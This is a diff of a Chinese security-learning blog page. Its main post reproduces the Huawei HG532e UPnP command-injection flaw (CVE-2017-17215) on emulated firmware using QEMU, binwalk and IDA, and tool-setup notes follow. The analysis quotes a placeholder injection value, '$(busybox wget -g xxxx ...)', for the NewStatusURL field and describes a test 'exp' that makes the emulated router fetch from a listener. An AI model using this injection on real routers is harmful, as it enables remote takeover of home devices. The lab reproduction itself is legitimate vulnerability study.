+<p>附上下载链接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ia601506.us.archive.org/22/items/RouterHG532e/router%20HG532e.rar</span><br></pre></td></tr></table></figure>
+<h2 id="2-先补一下这个漏洞的详情"><a href="#2-先补一下这个漏洞的详情" class="headerlink" title="2.先补一下这个漏洞的详情"></a>2.先补一下这个漏洞的详情</h2><p><strong>零日（CVE-2017-17215）</strong></p>
+<p>华为家庭网关采用通用即插即用（UPnP）协议。通过TR-064技术报告标准，该协议广泛用于嵌入式设备中，无缝连接并简化家庭和企业环境中网络的实施。</p>
+<p>TR-064专为本地网络配置而设计。例如，它允许工程师从内部网络中实现基本设备配置，固件升级等。</p>
+<p>但在这种情况下，华为设备中的TR-064实现通过端口37215（UPnP）暴露给WAN。</p>
+<p>从查看设备的UPnP描述，可以看出它支持名为<code>DeviceUpgrade</code>的服务类型。据推测，该服务通过向“/ ctrlt / DeviceUpgrade_1”（称为controlURL）发送请求来执行固件升级操作，并使用名为“NewStatusURL”和“NewDownloadURL”的两个元素执行。</p>
+<p>该漏洞允许远程管理员通过在NewStatusURL和NewDownloadURL中注入shell元字符“$（）”来执行任意命令，如下所示。</p>
+<p>Upnp：</p>
+<h3 id="1-分析环境是ubuntu-16-04"><a href="#1-分析环境是ubuntu-16-04" class="headerlink" title="1.分析环境是ubuntu 16.04."></a>1.分析环境是ubuntu 16.04.</h3><p>先用binwalk 解压一下：</p>
+<h3 id="2-配置复现环境"><a href="#2-配置复现环境" class="headerlink" title="2. 配置复现环境"></a>2. 配置复现环境</h3><p>安装 qemu：实现mips处理器构架模拟环境。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu </span><br><span class="line"></span><br><span class="line">sudo apt-get install qemu-user-static</span><br><span class="line"></span><br><span class="line">sudo apt-get install qemu-system</span><br></pre></td></tr></table></figure>
+<p>安装网络配置工具：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install bridge-utils uml-utilities</span><br></pre></td></tr></table></figure>
+<p>安装网络配置工具：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install bridge-utils uml-utilities</span><br></pre></td></tr></table></figure>
+<p>修改 ubuntu主机网络配置，将ubuntu主机系统中的网络接口配置文件 nano /etc/network/interfaces 修改为如下内容：</p>
+<p><a href="https://image.3001.net/images/20180111/15156587081163.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180111/15156587081163.png!small" alt="通过CVE-2017-17215学习路由器漏洞分析"></a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># ubuntu 16.04的系统用ens33代替eth0</span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"> </span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet manual</span><br><span class="line">up ifconfig eth0 0.0.0.0 up</span><br><span class="line"> </span><br><span class="line">auto br0</span><br><span class="line">iface br0 inet dhcp</span><br><span class="line">bridge_ports eth0</span><br><span class="line">bridge_maxwait 0</span><br></pre></td></tr></table></figure>
+<p>创建QEMU的网络接口启动脚本（nano /etc/qemu-ifup）并保存为如下内容：</p>
+<p>如果之前就已经有内容的话，直接在基础添加即可</p>
+<p><a href="https://image.3001.net/images/20180111/1515658972939.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180111/1515658972939.png!small" alt="通过CVE-2017-17215学习路由器漏洞分析"></a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">echo &quot;Executing /etc/qemu-ifup&quot;</span><br><span class="line">echo &quot;Bringing $1 for bridged mode...&quot;</span><br><span class="line">sudo /sbin/ifconfig $1 0.0.0.0 promisc up</span><br><span class="line">echo &quot;Adding $1 to br0...&quot;</span><br><span class="line">sudo /sbin/brctl addif br0 $1</span><br><span class="line">sleep 3</span><br></pre></td></tr></table></figure>
+<p>赋予文件/etc/qemu-ifup 可执行权限：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod a+x /etc/qemu-ifup</span><br></pre></td></tr></table></figure>
+<p>重启网络使所有的配置生效：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /etc/init.d/networking restart</span><br></pre></td></tr></table></figure>
+<p>关闭ens33，启动桥连网络br0</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ifdown eth0</span><br><span class="line">sudo ifdown br0</span><br><span class="line">sudo ifup br0</span><br></pre></td></tr></table></figure>
+<h3 id="3-debian-org-gt-aurel32-qemu-mips-下载对应的debian-mips-qemu镜像"><a href="#3-debian-org-gt-aurel32-qemu-mips-下载对应的debian-mips-qemu镜像" class="headerlink" title="3.debian.org/&gt;~aurel32/qemu/mips/下载对应的debian mips qemu镜像"></a>3.debian.org/&gt;~aurel32/qemu/mips/下载对应的debian mips qemu镜像</h3><p>我下载的是debian_squeeze_mips_standard.qcow2和vmlinux-2.6.32-5-4kc-malta。</p>
+<p>从<a href="https://people.debian.org/" target="_blank" rel="noopener">https://people.debian.org/</a>~aurel32/qemu/mips/下载对应的debian mips qemu镜像</p>
+<p><a href="https://image.3001.net/images/20180111/15156592945471.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180111/15156592945471.png!small" alt="通过CVE-2017-17215学习路由器漏洞分析"></a></p>
+<p>然后启动镜像</p>
+<figure class="highlight plain"><figcaption><span>qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic,macaddr=00:16:3e:00:00:01 -net tap</span><br><span class="line"></span><br><span class="line">sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -nographic</span><br></pre></td></tr></table></figure>
+<p>我下载的是debian_squeeze_mips_standard.qcow2和vmlinux-2.6.32-5-4kc-malta。</p>
+<p>好的，假如一切顺利，可以看到一个qemu虚拟机，</p>
+<p>用root/root登录进去:</p>
+<p><a href="https://image.3001.net/images/20180111/1515660657639.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180111/1515660657639.png!small" alt="通过CVE-2017-17215学习路由器漏洞分析"></a></p>
+<p>发现网络不通，ifconfig -a 看一下发现网络接口为eth1：</p>
+<p><a href="https://image.3001.net/images/20180111/15156609745022.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180111/15156609745022.png!small" alt="通过CVE-2017-17215学习路由器漏洞分析"></a></p>
+<p>将nano /etc/network/interfaces 文件中的eth0改为eth1：</p>
+<p><a href="https://image.3001.net/images/20180111/15156613687279.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180111/15156613687279.png!small" alt="通过CVE-2017-17215学习路由器漏洞分析"></a></p>
+<p>再用ifup eth1  将eth1启起来，运气好的话此时网络已经好了。</p>
+<h1 id="（这部分是抄的，直接借鉴的）"><a href="#（这部分是抄的，直接借鉴的）" class="headerlink" title="（这部分是抄的，直接借鉴的）"></a><code>（这部分是抄的，直接借鉴的）</code></h1><h3 id="4-环境搭建好，进行实际操作"><a href="#4-环境搭建好，进行实际操作" class="headerlink" title="4. 环境搭建好，进行实际操作"></a>4. 环境搭建好，进行实际操作</h3><p>在已经登陆的qemu里输入,查看ip地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig -a</span><br></pre></td></tr></table></figure>
+<p><img src="http://pico0ziv8.bkt.clouddn.com/18-12-3/29942034.jpg" alt></p>
+<p>直接操作虚拟机显然比较麻烦，在ubuntu上搞个SSH 连进来</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@192.168.127.141</span><br></pre></td></tr></table></figure>
+<p>再次输入密码即可</p>
+<p>将之前解压的固件包拷贝到虚拟机里面：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -r ./squashfs-root  root@192.168.127.141:/root/</span><br></pre></td></tr></table></figure>
+<p>完成搭建路由器固件运行的环境。</p>
+<p>找到固件所在的位置，想直接执行下upnp这个文件，报错,缺少相应的so文件造成。</p>
+<p><a href="https://image.3001.net/images/20180111/15156686001122.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180111/15156686001122.png!small" alt="图片.png"></a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chroot /root/squashfs-root /bin/sh</span><br></pre></td></tr></table></figure>
+<p>来切换根目录到路由器文件系统，执行成功：</p>
+<p><a href="https://image.3001.net/images/20180111/15156685477408.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180111/15156685477408.png!small" alt="通过CVE-2017-17215学习路由器漏洞分析"></a><br>可是发包过去仍然失败，应该是并没有启动监听服务</p>
+<p>那找下端口37215</p>
+<p><a href="https://image.3001.net/images/20180111/15156662004916.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180111/15156662004916.png!small" alt="通过CVE-2017-17215学习路由器漏洞分析"></a></p>
+<p>端口号只出现在mic文件内，看下文件内容：</p>
+<p><a href="https://image.3001.net/images/20180111/15156663101284.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180111/15156663101284.png!small" alt="通过CVE-2017-17215学习路由器漏洞分析"></a></p>
+<p>看字符串像是一个跟网络服务相关的文件，试下运行一下：</p>
+<p><a href="https://image.3001.net/images/20180111/15156664767325.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180111/15156664767325.png!small" alt="通过CVE-2017-17215学习路由器漏洞分析"></a></p>
+<p>看起来像是对了，</p>
+<p>ubuntu上nc -vlp 80 监听一下端口，跑一下exp，80端口收到路由器发来的wget 请求包。</p>
+<p><a href="https://image.3001.net/images/20180111/15156682779054.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180111/15156682779054.png!small" alt="通过CVE-2017-17215学习路由器漏洞分析"></a></p>
+<p>4.简单分析：</p>
+<p>分析一下upnp中的关键代码:</p>
+<p><a href="https://image.3001.net/images/20180112/15157334268937.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180112/15157334268937.png!small" alt="通过CVE-2017-17215学习路由器漏洞分析"></a></p>
+<p>根据上面payload图，newstatusurl这个节点值为 <newstatusurl>$(busybox wget -g xxxx ;xx;xx)</newstatusurl></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snprintf(a0,0x400,&quot;upg -g -U %s -t &apos;1 Firmware Upgrade Image&apos; -c upnp -r %s -d -&quot;,a3)</span><br></pre></td></tr></table></figure>
+<p>其中a0是拷贝的源字符串的地址，同时a0又是system 调用的第一个参数。所以最后会执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system（a0）</span><br></pre></td></tr></table></figure>
+<p>如果看完整篇文章想上手试一下路由器漏洞的话，不要忘了当初你是为什么放弃的.</p>
+<h2 id="5-甩进ida分析"><a href="#5-甩进ida分析" class="headerlink" title="5.甩进ida分析"></a>5.甩进ida分析</h2><h5 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><p>根据 Check Point 的报告<a href="https://research.checkpoint.com/good-zero-day-skiddie/" target="_blank" rel="noopener">【1】</a>，该远程命令执行漏洞的漏洞点位于 UPnP 服务中。</p>
+<p>UPnP 是由“通用即插即用论坛”（UPnP™ Forum）推广的一套网络协议。该协议的目标是使家庭网络（数据共享、通信和娱乐）和公司网络中的各种设备能够相互无缝连接，并简化相关网络的实现。</p>
+<p>直接将固件中负责 UPnP 服务的 upnp 程序扔到 IDA。</p>
+<p>用IDA直接打开 /HG532eV100R001C01B020_upgrade_packet.bin.extracted/squashfs-root/bin</p>
+<p>1.通过字符串 <code>NewStatusURL</code> 对漏洞点进行定位。直接在ida中的空白处按入空格，由流程图模式改为汇编代码模式，按shift+f12打开String Windows窗口，再按入alt+t，然后直接搜索<code>NewStatus</code>来定位该漏洞位置。</p>
+<p><img src="http://pico0ziv8.bkt.clouddn.com/18-12-3/41289211.jpg" alt></p>
+<p>2.跟踪数据的引用地址</p>
+<p><img src="http://pico0ziv8.bkt.clouddn.com/18-12-3/72288694.jpg" alt></p>
+<p>3.找到漏洞点如下</p>
+<p><img src="http://pico0ziv8.bkt.clouddn.com/18-12-3/78152986.jpg" alt></p>
+<h1 id="2-学习IDA-Pro"><a href="#2-学习IDA-Pro" class="headerlink" title="2.学习IDA Pro"></a>2.学习IDA Pro</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ps：先去学习一下ida pro的用法。</span><br><span class="line">我的ida pro链接，直接拖到ubuntu点解idap即可运行</span><br><span class="line">不过64位需要安装一下依赖</span><br><span class="line"></span><br><span class="line">sudo dpkg --add-architecture i386</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install libc6-i686:i386 libexpat1:i386 libffi6:i386 libfontconfig1:i386 libfreetype6:i386 libgcc1:i386 libglib2.0-0:i386 libice6:i386 libpcre3:i386 libpng12-0:i386 libsm6:i386 libstdc++6:i386 libuuid1:i386 libx11-6:i386 libxau6:i386 libxcb1:i386 libxdmcp6:i386 libxext6:i386 libxrender1:i386 zlib1g:i386 libx11-xcb1:i386 libdbus-1-3:i386 libxi6:i386 libsm6:i386 libcurl3:i386</span><br></pre></td></tr></table></figure>
+<p>分析一下upnp中的关键代码:</p>
+<p><a href="https://image.3001.net/images/20180112/15157334268937.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180112/15157334268937.png!small" alt="通过CVE-2017-17215学习路由器漏洞分析"></a></p>
+<p>根据上面payload图，newstatusurl这个节点值为 <newstatusurl>$(busybox wget -g xxxx ;xx;xx)</newstatusurl></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snprintf(a0,0x400,&quot;upg -g -U %s -t &apos;1 Firmware Upgrade Image&apos; -c upnp -r %s -d -&quot;,a3)</span><br></pre></td></tr></table></figure>
+<p>其中a0是拷贝的源字符串的地址，同时a0又是system 调用的第一个参数。所以最后会执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system（a0）</span><br></pre></td></tr></table></figure>
+<p>(借的图片Orz)</p>
+<h3 id="IDA-Pro基本知识"><a href="#IDA-Pro基本知识" class="headerlink" title="IDA Pro基本知识"></a>IDA Pro基本知识</h3><h5 id="1-基本常识"><a href="#1-基本常识" class="headerlink" title="1. 基本常识"></a>1. 基本常识</h5><p><img src="http://pico0ziv8.bkt.clouddn.com/18-12-3/55458895.jpg" alt></p>
+<p>红色窗口为函数列表，一个文件被反编译后所有的函数列表都可以在此窗格中显示；</p>
+<p>蓝色窗口为汇编代码区，双击每个函数，可以看到对应函数对应的汇编代码段；</p>
+<p>黑色窗口为输出窗口，文件反汇编过程中的信息都可以在此窗口中看到。</p>
+<h3 id="3-安装buildroot的坑"><a href="#3-安装buildroot的坑" class="headerlink" title="3.安装buildroot的坑"></a>3.安装buildroot的坑</h3><p><img src="http://pico0ziv8.bkt.clouddn.com/18-12-8/82814804.jpg" alt></p>
+<p>安装buildroot的时候不要把安装包下载到win10，然后在复制到ubuntu，容易导致hash值发生变化，引发报错。。。。。</p>
+<p>啥系统软件，在啥系统内下载</p>
+<h4 id="1-MIPS交叉编译环境的搭建（Buildroot）"><a href="#1-MIPS交叉编译环境的搭建（Buildroot）" class="headerlink" title="1. MIPS交叉编译环境的搭建（Buildroot）"></a>1. MIPS交叉编译环境的搭建（Buildroot）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.github的方式</span><br><span class="line"></span><br><span class="line"># 安装依赖库</span><br><span class="line">$ sudo apt-get update</span><br><span class="line">$ sudo apt-get install libncurses5-dev patch</span><br><span class="line"> </span><br><span class="line"># 下载源码</span><br><span class="line">$ git clone https://github.com/buildroot/buildroot.git</span><br><span class="line"> </span><br><span class="line"># 进行编译的配置</span><br><span class="line">$ cd buildroot</span><br><span class="line">$ make clean</span><br></pre></td></tr></table></figure>
+<h3 id="3-firmware-mod-kit工具的安装"><a href="#3-firmware-mod-kit工具的安装" class="headerlink" title="3. firmware-mod-kit工具的安装"></a>3. firmware-mod-kit工具的安装</h3><p>firmware-mod-kit工具的功能和binwalk工具的类似，其实firmware-mod-kit工具在功能上有调用binwalk工具提供的功能以及其他的固件解包工具的整合。下载firmware-mod-kit工具的源码进入到src目录下就能够看到firmware-mod-kit工具整合了那些固件提取和文件系统解压的工具。firmware-mod-kit工具的功能有固件文件的解包和打包、固件提取文件系统的解压和压缩、DD-WRT Web Pages的修改等，在每个整合的固件分析工具的源码文件夹里都有相关的使用说明。</p>
+<h4 id="1-安装依赖"><a href="#1-安装依赖" class="headerlink" title="1.安装依赖"></a>1.安装依赖</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">For Ubuntu 需要安装的依赖库文件</span><br><span class="line">sudo apt-get install git build-essential zlib1g-dev liblzma-dev python-magic</span><br></pre></td></tr></table></figure>
+<h4 id="4-下载安装"><a href="#4-下载安装" class="headerlink" title="4. 下载安装"></a>4. 下载安装</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/mirror/firmware-mod-kit.git</span><br><span class="line"> </span><br><span class="line"># 进入源码目录</span><br><span class="line">cd firmware-mod-kit/src</span><br><span class="line"> </span><br><span class="line"># 执行configure文件生成Makefile文件然后make编译生成可执行文件</span><br><span class="line">./configure &amp;&amp; make</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
     </div>
     
-    <div class="post-archive">
     
     
-    
-    
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/06/20/51学习/" >51单片机学习</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/06/20/32学习/" >stm32入门学习</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> 2019 </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">11/19</span><a class="archive-post-title" href= "/2019/11/19/路由器实验复现（1）hg532e/" >路由器实验复现（1）hg532e</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">10/21</span><a class="archive-post-title" href= "/2019/10/21/gdb工具pwndbg与peda与gef配置/" >pwn工具配置与使用，并且自动切换gdb脚本</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">10/14</span><a class="archive-post-title" href= "/2019/10/14/PWN入门学习(2)基本的ROP/" >pwn入门学习(2)pwn-wiki（basic ROP)</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">06/20</span><a class="archive-post-title" href= "/2019/06/20/安洵杯CTF rfid题/" >安洵杯CTF rfid题</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">06/20</span><a class="archive-post-title" href= "/2019/06/20/SYC第二次面试报告/" >SYC第二次面试报告</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">06/20</span><a class="archive-post-title" href= "/2019/06/20/SYC第三次面试报告/" >SYC第三次面试报告</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/06/20/arduino入门/" >arduino入门</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/06/20/bladerf/" >blaedrf入门学习</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/06/20/c118 osmocombb/" >Ubuntu编译OsmocomBB 环境</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> 2019 </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">06/20</span><a class="archive-post-title" href= "/2019/06/20/gsm/" >gsm</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">06/20</span><a class="archive-post-title" href= "/2019/06/20/freebuf第一次/" >freebuf第一次</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/10/21/pwn入门学习(1)栈溢出基础知识/" >栈溢出基础知识</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/11/14/pwn工具配置与使用，并且自动切换gdb脚本/" >pwn工具配置与使用，并且自动切换gdb脚本</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/06/20/python study/" >Python入门</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> 2019 </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">10/17</span><a class="archive-post-title" href= "/2019/10/17/ubertooth环境搭建手册/" >搭建ubertooth环境</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">10/12</span><a class="archive-post-title" href= "/2019/10/12/逆向学习/" >逆向学习</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">06/20</span><a class="archive-post-title" href= "/2019/06/20/路由器·漏洞挖掘/" >360 iot 路由器漏洞挖掘</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">06/20</span><a class="archive-post-title" href= "/2019/06/20/常用设备配置/" >设备常用配置</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">06/20</span><a class="archive-post-title" href= "/2019/06/20/固定码逆向分析/" >固定码逆向分析</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/10/22/常见函数与汇编指令/" >常见函数与汇编指令</a>
-        </li>
-    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://devil0x.github.io/2019/11/14/pwn工具配置与使用，并且自动切换gdb脚本/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="devil0x">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="devil0x菜鸟">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/11/14/pwn工具配置与使用，并且自动切换gdb脚本/" itemprop="url">pwn工具配置与使用，并且自动切换gdb脚本</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-14T22:35:07+08:00">
+                2019-11-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><h3 id="基础的ubuntu配置"><a href="#基础的ubuntu配置" class="headerlink" title="基础的ubuntu配置"></a>基础的ubuntu配置</h3><h4 id="1-换国内源"><a href="#1-换国内源" class="headerlink" title="1.换国内源"></a>1.换国内源</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial main</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial main</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-updates main</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial universe</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial universe</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-updates universe</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates universe</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-security main</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-security universe</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-security universe</span><br></pre></td></tr></table></figure>
+<h4 id="2-换终端"><a href="#2-换终端" class="headerlink" title="2.换终端"></a>2.换终端</h4><p> 教程：<a href="https://www.jianshu.com/p/27c8088dc8f7" target="_blank" rel="noopener">https://www.jianshu.com/p/27c8088dc8f7</a> </p>
+<h4 id="2-趁手的python环境"><a href="#2-趁手的python环境" class="headerlink" title="2.趁手的python环境"></a>2.趁手的python环境</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.安装python以及pip</span><br><span class="line">2.首先安装交互式Python版本，ipython，</span><br><span class="line">sudo apt install ipython</span><br></pre></td></tr></table></figure>
